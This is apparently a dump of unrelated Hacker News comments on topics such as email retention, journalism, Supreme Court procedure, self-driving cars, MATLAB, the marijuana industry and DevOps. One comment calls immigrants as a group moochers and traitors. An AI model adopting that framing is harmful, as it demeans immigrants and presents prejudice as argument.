Then we got a new email retention policy of 6 months after which emails were deleted because we were migrating from Lotus Notes to Exchange.  We had a local archive option for people who wanted to retain emails older than 6 months.  Then we got a hardware refresh where those archives were not automatically migrated to new hardware.  Not that the new machines had Lotus Notes anyways.  The IT Asset group was instructed to remove Hard drives from old hardware and wipe them because HIPAA.  Even if they hadn&#x27;t wiped the drives, they weren&#x27;t documenting which drive came from which machine when they binned them so you wouldn&#x27;t be able to decrypt the drive because TPM.  Also they were removing asset tags from decommissioned machines as they prepared them for the reseller.  12 months later they reevaluated the email retention policy and decided to increate it 24 months.<p>Emails?

The old school media offered a quick barrage of articles on a wide variety of topics. They didn&#x27;t cover any one particularly well (just look at a newspaper article about a topic you&#x27;re in a expert in if you want proof of that), but they did decently enough at informing people in an age where information was inconvenient or costly to otherwise get.<p>The internet changed that.  For any important news, you can find better sources on social media, since people at the scene will probably now be posting photos and opinions about the goings on as they&#x27;re happening, no reporter required. For timely news, social media and aggregator sites simply do better than journalists, since they don&#x27;t have to worry about editors or proofing and there&#x27;s a large crowd of people looking for stories at the same time (usually many times larger than the team in a professional newspaper).<p>And for more informative pieces, you can just go straight to the experts now.  Whereas before you&#x27;d have a journalist approach an expert on say, information security, you can now just find an expert&#x27;s blog or a relevant forum or subreddit instead.  Bonus points for their words likely not being censored or altered or anything else.<p>And the fourth estate thing? Well, for better or worse, now that seems to be the legions of bloggers and amateur journalists online instead.  The traditional media kind of gave up on that when most of the papers and news channels were bought by large companies.<p>You can try paywalls and subscriptions and patreon type systems all you like, I just suspect the old way of doing news simply cannot work in the internet era, and the traditional journalist is simply becoming obsolete.<p>For the article&#x27;s question about how the relationship is supposed to work and what media built on newer platforms will be like... it&#x27;ll be amateurs and companies reporting the news on their own.",1447365543

I&#x27;m not a lawyer, I just happen to have studied a bit of legal procedure in college and the Supreme Court in particular.  Thus, I know the process and why one normally petitions them for a writ of certiorari simply because the Supreme Court has original jurisdiction over only some obscure types of cases and thus does not hear most cases.  See also:  <a href=""https://www.law.cornell.edu/wex/certiorari"" rel=""nofollow"">https://www.law.cornell.edu/wex/certiorari</a><p>> we&#x27;re asking what the government should do with the funds before we know the result of the case<p>The converse is that we have two innocent people who have money frozen.  One can pay for a lawyer, the other cannot.<p>If you find this is a Sixth Amendment violation, then isn&#x27;t the Public Defenders office itself a violation?  If that&#x27;s the case, why are they not arguing that we cure that?  The answer is that it wouldn&#x27;t help them:  they are able to afford a rather expensive lawyer.  It&#x27;s true that a full defense is expensive, but they&#x27;re just causing themselves harm with an expensive Supreme Court appeal rather than saving the funds for the main defense.  There are quite a few weird expenses involved there, not the least of which is the special booklets prepared for each justice and several other parties which have a large number of very exacting rules.  Also, of note, is the fact that one can petition the Supreme Court &#x27;in forma pauperis&#x27; and the Supremes will in fact pick up the tab for all that if you actually can&#x27;t pay.  They have accepted pro se applicants who were then provided representation for all the expensive formalities and such.<p>I think there is a good point that it&#x27;s not at all fair that some people can get their own lawyer while others cannot. It would be better if that was fair for everyone, rather than rich people paying for better treatment.<p>Alas, that&#x27;s not at all what petitioner is asking for.  They&#x27;re only interested in a rule that would help themselves here and that would encourage people who defrauded or robbed others to spend the stolen money first.  So I steal all of your money and use it to pay for an expensive lawyer to get away with it, while poor but innocent people would have to rely on a state-appointed lawyer.",1447365523

There will always be a need for &quot;drivers&quot;, not just humans, for transporting goods, services etc. Is driving an exercise of just connecting our senses? No. It also involves performing actions based on inputs from these senses. Why would anyone want to create VR based drivers? It makes no sense, because self driving cars are already possible. Self driving cars have already won the competition in this case. This is the one scenario where VR and self driving cars compete.<p>Now consider the profession of software development. Here, let&#x27;s say VR made it such that you wouldn&#x27;t have a need to drive to work. Then, you wouldn&#x27;t drive to work, but you&#x27;d still need to get places - for which a car (maybe self driving) is still required. In this case, again, self driving cars and VR are not competing. One has made removed the need for the other for a very specific purpose.

It also handles events and state so that each unit runs only within a single thread which completely eliminates the need to worry about threat synchronization. Basically a multithreaded node.js engine. Along with using javascript or Java8 lambdas and promises, it makes for very nice code.<p>The async style also allows for faster code in fairly typical web server cases. Consider a request that needs to do an HTTP lookup and 3 database calls. In a blocking I/O case, this needs a memory heavy thread and each I/O operation must be done sequentially even if we need the result from all 4 operations to give the result.

It&#x27;s really awesome for prototyping complex math-based algorithms as an intermediate step before writing a battle-ready implementation. There&#x27;s a ton of libraries so you can think in terms of high level concepts, and the matrix math is very natural, as is Gpu integration which is a huge plus. Once it&#x27;s in code, you can iterate quickly relying on libraries, and even create a gui very quickly. When you settle on a final implementation, you can do a 1:1 port to the optimal runtime to make the code more modular, extensible, and fast.<p>Once you get used to the indexing and quirks, it&#x27;s a prototyping dream. In a day I can do what would take weeks to implement in C++ or even Python, and I can decide if the algorithm is good enough to warrant a full port. Once I make that call, it&#x27;s trivial to decide which parts of the algorithm I should work on optimizing for speed during the port because you can analyze perf of each step. Granted, I do a lot of image processing which is sort of an ideal matlab use case.<p>I totally agree though, writing software to solve real world problems is much more riveting than writing endless web apps (I&#x27;ve done both.)",1447364062

I don&#x27;t hate people because of their origins or race, nor to I not like foreigners. You are surely not going to like hearing ths, but immigrants are essentially moochers on one hand, and traitors on the other. Moochers on both ends because if they were educated for essentially free in, e.g., Europe and come to the USA they both mooched off their source country and then they come to the USA to mooch off what the USA and Americans built. Traitors because they mooched off their country to get an education and are now putting their labor, knowledge, and skill to use for a different country or society instead of building up the country they came from and still hold on to even when they are in the USA.<p>The humongous forest that pro immigrant people can&#x27;t see for all the trees is that immigration is a core driver and reason for many of not only America&#x27;s problems, but also the lack of source countries from gaining any traction. All the way from sapping out pressure for social change by motivated people leaving for places where they can mooch over the fight that was already won by others, to extracting the skill and knowledge to do the thing that the do from their society.

There&#x27;s really nothing novel about any part of the industry except that it&#x27;s now legal. Indoor growing / hydroponics are used for a wide variety of plants, so the tech on the production front is already mature (if not commoditized). Because it&#x27;s pretty cheap to produce and doesn&#x27;t take a ton of special knowledge, wide legalization will see a race to the bottom on price (along with razor-thin margins for growers). Prices are still very high right now because nobody can achieve sufficient scale (again, thanks to the weird legal environment) but once they do, prices and margins will fall and a lot of growers will get bought out or go out of business. It doesn&#x27;t really cost much to grow super-high quality marijuana on an industrial scale.<p>The rest of the value chain is really nothing novel either if you ignore the weird regulatory environment that currently exists. A retail store selling weed is not much different from any other retail store. A delivery service is still subject to the same fundamental issues as any other delivery service -- and when weed becomes really cheap, a $10 delivery fee may not make sense when you&#x27;re buying $20 worth of weed. There&#x27;s room in the market for differing tastes and consumption methods, but those too are more or less commoditized and can use general-purpose industrial processing equipment.<p>There&#x27;s a boom right now because the market is growing quickly, but there will be a corresponding crash once the consumer market starts to hit the point where scale matters.",1447363188
10556210,comment,10555425,10556082,0,0,teddyh,,,"As I said, an ordinary person has little interaction with the state, so there are fewer direct opportunities for harassment. Moreover, the state has little reason to harass the usual persons offered amnesty from prosecution, since those people have usually not been in direct opposition to the state itself – they are usually just criminals.<p>However, if they had <i>been</i> in opposition to the state itself, it would probably be a different story.  For instance, I don’t think Snowden could ever fully trust a (theoretical) offer of amnesty from the U.S. government.  A similar situation (to the VW one) exists with <i>employees</i> of the state who continue to be employed by the state – they interact with the state more (in its role as their employer), and more interaction means more possibilities of harassment.  Also, even some people who quit their jobs would be affected; these would be people who were employed by state actors which have a lot of interactions with people in general, like the IRS, the DMV or the Police.  I would imagine that former employees at any of these organizations who quit their jobs and turned whistleblowers would experience trouble from their former employers.  On the other hand, a whistleblowing former clerk from, say, the Department of Veterans Affairs, would probably not.<p>What I’m saying here is that there are two factors: The degree of interaction a person has with the organization <i>after</i> the event, and the degree to which the person was percieved to be in direct opposition to the organization itself.  The VW employees score very highly on both these factors, while the median person offered amnesty from prosecution from the state usually scores low on both.",1447363182

Sometimes DevOps means that.  Lately &quot;DevOps engineer&quot; means some mix of infrastructure automation (basically systems administration) and writing a few tools or scripts (often these tools require some degree of coding).  It can get more custom code heavy depending on the organization, but there&#x27;s no real standard.<p>But ultimately, &quot;DevOps&quot; is a (usually confusing) catch-all.  Most &quot;DevOps&quot; conference are really a mix of agile, process, and systems administration topics, and many DevOPs meetups are usually about elevating one&#x27;s game at systems administration and sometimes about Continous Deployment -- though even this can vary.<p>Personally I like the tech parts and don&#x27;t care as much for the cultural parts, having found a lot of it, once heard 4 or 5 times, becomes a bit &quot;preaching to the choir&quot; - i.e. folks know it already.  Which is why I think once you learn the agile/process/communication bits, the meetups get to be more about tools - these things change and can be new, but there&#x27;s some percieved duty to keep educating the new folks on the cultural stuff (especially as folks may feel some industries that are less startup-like are slower movers, or for folks in large corps that are slower to adopt things).",1447362123
